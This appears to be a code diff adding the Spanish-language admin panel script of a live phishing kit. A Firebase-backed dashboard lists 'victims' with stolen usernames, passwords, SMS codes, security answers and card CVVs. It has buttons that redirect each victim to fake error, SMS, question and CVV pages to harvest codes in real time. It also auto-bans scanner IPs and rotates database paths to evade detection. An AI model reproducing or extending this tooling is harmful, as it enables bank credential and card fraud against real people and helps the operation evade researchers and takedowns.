+    const ip = _blockData.ip || 'desconocida';
+    if(ip !== 'desconocida') {
+      db.ref('blocks/ips/'+ip.replace(/\./g,'_')).set({ip:ip, ts:Date.now()});
+      toast('<i class="fas fa-ban"></i> IP Bloqueada');
+    } else {
+      toast('No hay IP para bloquear', '#ef4444');
+    }
+  }
+  if(type==='userpass'){
+    db.ref('blocks/users/'+btoa(usr+':'+clv).replace(/=/g,'')).set({usuario:usr,clave:clv,ts:Date.now()});
+    toast('<i class="fas fa-user-slash"></i> User+Pass bloqueados',var2color('--red'));
+  }
+  if(type==='all'){
+    // Bloquear en Firebase y borrar TODAS las sesiones con mismo user+pass
+    db.ref('blocks/users/'+btoa(usr+':'+clv).replace(/=/g,'')).set({usuario:usr,clave:clv,ts:Date.now()});
+    let borradas=0;
+    Object.entries(data).forEach(([k,v])=>{
+      if((v.usuario||'')===(usr)&&(v.clave||'')===(clv)){
+        db.ref(DB_PATH+'/'+k).remove();
+        borradas++;
+      }
+    });
+    toast(`<i class="fas fa-skull"></i> Bloqueado y eliminadas ${borradas} sesiones`,var2color('--red'));
+  }
+  if(type==='bot'){
+    const ip = _blockData.ip || '';
+    const u = _blockData.usuario || '';
+    
+    // 1. Bloquear IP
+    if(ip) db.ref('blocks/ips/'+ip.replace(/\./g,'_')).set({ip:ip, ts:Date.now()});
+    // 2. Bloquear Usuario
+    if(u) db.ref('blocks/patterns/'+btoa(u).replace(/=/g,'')).set({patron:u, ts:Date.now()});
+    
+    // 3. Borrar todo rastro de ese bot en toda la base de datos
+    let borradas = 0;
+    Object.entries(data).forEach(([k,v])=>{
+      if((ip && v.ip === ip) || (u && v.usuario === u) || (v._k && !v.ip)){
+        db.ref(DB_PATH+'/'+k).remove();
+        borradas++;
+      }
+    });
+    toast(`<i class="fas fa-robot"></i> Bot Erradicado. ${borradas} basuras eliminadas.`, var2color('--purple'));
+  }
+  closePop();
+}
+function var2color(v){
+  const m={'--orange':'#f59e0b','--red':'#ef4444','--green':'#10b981','--purple':'#8b5cf6'};
+  return m[v]||'#64748b';
+}
+
+// ===== COMMANDS =====
+window._preguntasTarget=null;
+function sendCmd(id, action, extra){
+  const pages={
+    'inicio':'inicio.html','error_login':'inicio_error.html?id='+id,
+    'carga':'carga.html','sms':'codigosms.html',
+    'sms_error':'codigosms_error.html',
+    'preguntas':'preguntas.html','error_preguntas':'preguntas.html?err=1',
+    'cv_temp':'cv_temp.html?id='+id,'error_cv_temp':'cv_temp.html?err=1&id='+id,
+    'cvv':'cvv.html','error_cvv':'cvv.html?err=1'
+  };
+  const page=pages[action]||action;
+  const payload={action,page,ts:Date.now(),...(extra||{})};
+  db.ref(DB_PATH+'/'+id+'/command').set(payload);
+  db.ref(DB_PATH+'/'+id+'/page').set(page);
+  toast(`<i class="fas fa-bolt"></i> ${action} → enviado`,'#1a6fd4');
+}
+
+window.openPreguntas=function(id){
+  _modalVictimId=id;
+  document.getElementById('mpreg-sub').textContent='Escribe las preguntas para: '+id.slice(-8);
+  document.getElementById('mpreg-q1').value='';
+  document.getElementById('mpreg-q2').value='';
+  openModal('modal-preguntas');
+  setTimeout(()=>document.getElementById('mpreg-q1').focus(),200);
+};
+
+window.sendPreguntas=function(){
+  if(!_modalVictimId)return;
+  const q1=document.getElementById('mpreg-q1').value.trim();
+  const q2=document.getElementById('mpreg-q2').value.trim();
+  if(!q1&&!q2){toast('<i class="fas fa-exclamation"></i> Escribe al menos una pregunta','#f59e0b');return;}
+  // Guardar preguntas directamente en el registro (no se borran con el comando)
+  db.ref(DB_PATH+'/'+_modalVictimId).update({pregunta1:q1, pregunta2:q2});
+  // Luego enviar comando de navegacion
+  sendCmd(_modalVictimId,'preguntas',{pregunta1:q1,pregunta2:q2});
+  closeModal('modal-preguntas');
+  toast('<i class="fas fa-question-circle"></i> Preguntas enviadas','#8b5cf6');
+};
+
+window.deleteVictim=function(id){
+  db.ref(DB_PATH+'/'+id).remove();
+  toast('<i class="fas fa-trash"></i> Sesión eliminada','#ef4444');
+};
+window.cleanVictim=function(id){
+  db.ref(DB_PATH+'/'+id).update({clave:'',sms:'',preguntas:'',cv_temp:''});
+  toast('<i class="fas fa-broom"></i> Limpiada');
+};
+window.clearAll=function(){
+  if(!confirm('¿Eliminar TODAS las sesiones?'))return;
+  const data=window._allData||{};
+  Object.keys(data).forEach(k=>db.ref(DB_PATH+'/'+k).remove());
+  toast('<i class="fas fa-fire"></i> Todas eliminadas','#ef4444');
+};
+
+// ===== FILTER =====
+function filterTable(q){
+  const rows=document.querySelectorAll('#victims-body tr');
+  q=q.toLowerCase();
+  rows.forEach(r=>{r.style.display=(!q||r.textContent.toLowerCase().includes(q))?'':'none';});
+}
+
+// ===== BOT DETECTION =====
+function detectBots(data){
+  const groups={};
+  Object.entries(data).forEach(([k,v])=>{
+    const key=(v.usuario||'')+'|'+(v.clave||'');
+    if(!groups[key])groups[key]=[];
+    groups[key].push(k);
+  });
+  return groups;
+}
+
+// ===== RENDER =====
+function buildRow(id, v, botCount){
+  const isOnline=v.estado==='online';
+  const sBadge=isOnline
+    ? `<span class="s-online"><span class="s-dot s-dot-on"></span>EN LÍNEA</span>`
+    : `<span class="s-offline"><span class="s-dot s-dot-off"></span>OFFLINE</span>`;
+
+  const usr=v.usuario?`<span class="cell-data">${v.usuario}</span>`:'<span class="cell-data empty">—</span>';
+  const clv=v.clave?`<span class="cell-data" style="color:var(--orange)">${v.clave}</span>`:'<span class="cell-data empty">—</span>';
+  var smsHtml = [];
+  if(v.sms) smsHtml.push('<span style="color:var(--muted2);font-size:9px">SMS:</span> <span class="cell-data" style="color:var(--teal)">'+v.sms+'</span>');
+  if(v.cv_temp) smsHtml.push('<span style="color:var(--muted2);font-size:9px">CV:</span> <span class="cell-data" style="color:var(--pink)">'+v.cv_temp+'</span>');
+  if(v.cvv) smsHtml.push('<span style="color:var(--muted2);font-size:9px">CVV:</span> <span class="cell-data" style="color:var(--yellow)">'+v.cvv+'</span>');
+  const sms = smsHtml.length ? '<div style="line-height:1.4;text-align:left;">'+smsHtml.join('<br>')+'</div>' : '<span class="cell-data empty">—</span>';
+  var pregHtml='<span class="cell-data empty">—</span>';
+  if(v.preguntas){
+    var pg=v.preguntas;
+    var parts=[];
+    if(pg.resp1) parts.push('<span style="color:var(--muted2);font-size:9px">R1:</span><span style="color:var(--purple)"> '+pg.resp1+'</span>');
+    if(pg.resp2) parts.push('<span style="color:var(--muted2);font-size:9px">R2:</span><span style="color:var(--purple)"> '+pg.resp2+'</span>');
+    if(pg.dispositivo) parts.push('<span style="color:var(--teal);font-size:9px"> ['+pg.dispositivo+']</span>');
+    if(parts.length) pregHtml='<div style="font-size:10px;text-align:left;line-height:1.6">'+parts.join('<br>')+'</div>';
+  }
+  const preg=pregHtml;
+  const cvTempHtml = v.cv_temp
+    ? `<span class="cell-data" style="color:var(--pink);font-weight:700;font-size:12px;">${v.cv_temp}</span>`
+    : '<span class="cell-data empty">—</span>';
+
+  const botWarn=botCount>2?`<span class="bot-warn" onclick="showBlockPop('${id}',event)" title="${botCount} sesiones iguales"><i class="fas fa-robot"></i> ×${botCount}</span>`:' ';
+  const ipHtml = v.ip ? `<div style="font-size:9px;color:var(--muted2);margin-top:2px;">IP: ${v.ip}</div>` : "";
+  const captchaBadge = v._bot_captcha
+    ? '<span style="background:rgba(234,179,8,.2);color:#eab308;border:1px solid rgba(234,179,8,.5);border-radius:4px;font-size:9px;padding:1px 5px;font-weight:700;display:inline-block;margin-top:3px;">BOT CAPTCHA</span>'
+    : '';
+  
+  
+
+  return `<tr id="row-${id}">
+    <td class="cell-id" title="">   \</td>
+    <td>${usr}${captchaBadge}</td>
+    <td>${clv}</td>
+    <td>${sms}</td>
+    <td>${cvTempHtml}</td>
+    <td style="max-width:120px;overflow:hidden">${preg}</td>
+    <td><span style="font-size:9px;color:var(--muted)">${v.page||'—'}</span></td>
+    <td>${sBadge}</td>
+    <td>
+      <div class="btn-group">
+        <button class="btn btn-red"    onclick="sendCmd('${id}','error_login')"><i class="fas fa-times-circle"></i> Err Login</button>
+        <button class="btn btn-teal"   onclick="sendCmd('${id}','sms')"><i class="fas fa-sms"></i> SMS</button>
+        <button class="btn btn-orange" onclick="sendCmd('${id}','sms_error')"><i class="fas fa-ban"></i> Err SMS</button>
+        <button class="btn btn-purple" onclick="openPreguntas('${id}')"><i class="fas fa-question-circle"></i> Preguntas</button>
+        <button class="btn btn-red"    onclick="sendCmd('${id}','error_preguntas')"><i class="fas fa-times"></i> Err Preg</button>
+
+        <button class="btn"            onclick="sendCmd('${id}','cv_temp')" style="background:rgba(236,72,153,.15);color:#ec4899;border:1px solid rgba(236,72,153,.3)"><i class="fas fa-key"></i> CV Temp</button>
+        <button class="btn btn-red"    onclick="sendCmd('${id}','error_cv_temp')"><i class="fas fa-times"></i> Err CV Temp</button>
+
+        <button class="btn btn-blue"   onclick="sendCmd('${id}','cvv')" style="background:rgba(234,179,8,.15);color:#eab308;border:1px solid rgba(234,179,8,.3)"><i class="fas fa-credit-card"></i> CVV</button>
+        <button class="btn btn-red"    onclick="sendCmd('${id}','error_cvv')"><i class="fas fa-times"></i> Err CVV</button>
+      </div>
+    </td>
+    <td>
+      <div class="btn-group">
+        <button class="btn btn-danger" onclick="deleteVictim('${id}')"><i class="fas fa-trash"></i></button>
+        <button class="btn btn-muted"  onclick="cleanVictim('${id}')"><i class="fas fa-broom"></i></button>
+        <button class="btn" style="background:rgba(245,158,11,.15);color:#fbbf24;border:1px solid rgba(245,158,11,.3)" onclick="showBlockPop('${id}',event)" title="Bloquear"><i class="fas fa-shield-alt"></i></button>
+      </div>
+    </td>
+  </tr>`;
+}
+
+function renderAll(data){
+  data=data||{};
+  const keys=Object.keys(data);
+  const groups=detectBots(data);
+  let botSessions=0;
+  Object.values(groups).forEach(g=>{if(g.length>2)botSessions+=g.length;});
+
+  document.getElementById('s-total').textContent=keys.length;
+  document.getElementById('s-online').textContent=keys.filter(k=>data[k].estado==='online').length;
+  document.getElementById('s-creds').textContent=keys.filter(k=>data[k].clave).length;
+  document.getElementById('s-sms').textContent=keys.filter(k=>data[k].sms).length;
+  document.getElementById('s-pregs').textContent=keys.filter(k=>data[k].preguntas).length;
+  document.getElementById('s-bots').textContent=botSessions;
+  document.getElementById('vcnt').textContent=keys.length;
+
+  if(keys.length===0){
+    document.getElementById('empty-state').style.display='flex';
+    document.getElementById('table-wrap').style.display='none';
+    document.getElementById('victims-body').innerHTML='';
+    return;
+  }
+  document.getElementById('empty-state').style.display='none';
+  document.getElementById('table-wrap').style.display='block';
+
+  // Get user/pass groups for bot count per victim
+  const userPassCount={};
+  Object.entries(data).forEach(([k,v])=>{
+    const key=(v.usuario||'')+'|'+(v.clave||'');
+    userPassCount[k]=(groups[key]||[]).length;
+  });
+
+    // --- BOT WATCHER: ESCUDO ACTIVO ---
+  const ipCounts = {};
+  Object.keys(data).forEach(k => {
+    const v = data[k];
+    if(v.ip) {
+      ipCounts[v.ip] = (ipCounts[v.ip] || 0) + 1;
+    }
+  });
+  
+  // Si una IP tiene más de 4 sesiones, es un bot 100%. Auto-banear.
+  Object.keys(ipCounts).forEach(ip => {
+    if(ipCounts[ip] > 4) {
+      console.warn("Auto-Ban disparado para IP: ", ip);
+      db.ref('blocks/ips/'+ip.replace(/\./g,'_')).set({ip:ip, ts:Date.now()});
+      // Borrar todas sus sesiones
+      Object.keys(data).forEach(k => {
+        if(data[k].ip === ip) {
+          db.ref(DB_PATH+'/'+k).remove();
+        }
+      });
+      toast(`<i class="fas fa-shield-alt"></i> Auto-Ban: IP ${ip} bloqueada por spam`, '#ef4444');
+    }
+  });
+
+  // ===== Contador de captcha =====
+  const captchaCount = data['M_captcha'] ? 1 : 0;
+  document.getElementById('s-captcha').textContent = captchaCount > 0
+    ? (data['M_captcha'].count_captcha || '1+')
+    : '0';
+
+  document.getElementById('victims-body').innerHTML=
+    keys.sort((a,b)=>(data[b].ts||0)-(data[a].ts||0))
+        .map(k=>buildRow(k,data[k],userPassCount[k]))
+        .join('');
+
+  // Resaltar fila captcha en naranja
+  if(data['M_captcha']){
+    const row = document.getElementById('row-M_captcha');
+    if(row){
+      row.style.background = 'rgba(234,179,8,.08)';
+      row.style.borderLeft = '3px solid #eab308';
+    }
+  }
+
+  // ===== DETECTOR DE ATAQUE 7s =====
+  detectBurst7s(data);
+}
+
+// ===== BURST DETECTOR: bots que llegan cada ~7 segundos =====
+var _burstHistory = {}; // { ip: [timestamps] }
+function detectBurst7s(data){
+  const now = Date.now();
+  Object.keys(data).forEach(k => {
+    const v = data[k];
+    if(!v.ip || !v.first_seen) return;
+    const ip = v.ip;
+    if(!_burstHistory[ip]) _burstHistory[ip] = [];
+    _burstHistory[ip].push(v.first_seen);
+    // Keep only last 30s
+    _burstHistory[ip] = _burstHistory[ip].filter(t => now - t < 30000);
+  });
+
+  // Analizar cada IP: ¿tiene 3+ sesiones con intervalos de 5-9s?
+  let detected = false;
+  let detectedIP = null;
+  let detectedCount = 0;
+  Object.keys(_burstHistory).forEach(ip => {
+    const times = _burstHistory[ip].sort((a,b)=>a-b);
+    if(times.length < 3) return;
+    let burstCount = 0;
+    for(let i = 1; i < times.length; i++){
+      const diff = times[i] - times[i-1];
+      if(diff >= 4500 && diff <= 9000) burstCount++;
+    }
+    if(burstCount >= 2){
+      detected = true;
+      if(times.length > detectedCount){
+        detectedIP = ip;
+        detectedCount = times.length;
+      }
+    }
+  });
+
+  const banner = document.getElementById('alert-burst');
+  if(detected && detectedIP){
+    document.getElementById('alert-burst-msg').innerHTML =
+      `⚠️ ATAQUE DETECTADO: IP <b>${detectedIP}</b> enviando bots cada ~7s (${detectedCount} sesiones). ¡Rota el PATH ahora!`;
+    banner.style.display = 'flex';
+    // Auto-bloquear la IP
+    db.ref('blocks/ips/' + detectedIP.replace(/\./g,'_')).set({
+      ip: detectedIP, ts: Date.now(), razon: 'burst_7s_attack'
+    });
+  } else {
+    if(banner.style.display !== 'none') banner.style.display = 'none';
+  }
+}
+
+// ===== ROTAR PATH: cambia el sufijo de Firebase para cortar bots =====
+window.rotarPath = function(){
+  if(!confirm('⚠️ ROTAR PATH: Esto cambia el ID de Firebase.\nLas sesiones actuales desaparecerán del panel.\nLos bots quedarán cortados de raíz.\n¿Confirmar?')) return;
+
+  // Generar nuevo sufijo aleatorio de 6 chars
+  var chars = 'abcdefghijklmnpqrstuvwxyz0123456789';
+  var newSuffix = '';
+  for(var i=0;i<6;i++) newSuffix += chars[Math.floor(Math.random()*chars.length)];
+
+  var newPath = _auto_path.replace(/_s2x0$/, '') + '_' + newSuffix;
+
+  // Guardar en Firebase meta para que config.js lo lea en las páginas
+  db.ref('meta/active_path').set(newPath).then(function(){
+    toast('<i class="fas fa-random"></i> PATH rotado → ' + newPath + ' (¡actualiza config.js!)', '#10b981');
+    document.getElementById('alert-burst').style.display = 'none';
+
+    // Mostrar instrucciones
+    var msg = 'NUEVO PATH: ' + newPath + '\n\nAbre config.js en tu hosting y cambia la última línea a:\nvar SITE_ID = "' + newPath + '";\n\nSube config.js actualizado y los bots quedan MUERTOS.';
+    setTimeout(function(){ alert(msg); }, 500);
+  });
+};
+
+// ===== HIGHLIGHT captcha rows in buildRow =====
+const _origBuildRow = buildRow;
+
+checkSession();
+</script>
+</body>
+</html>
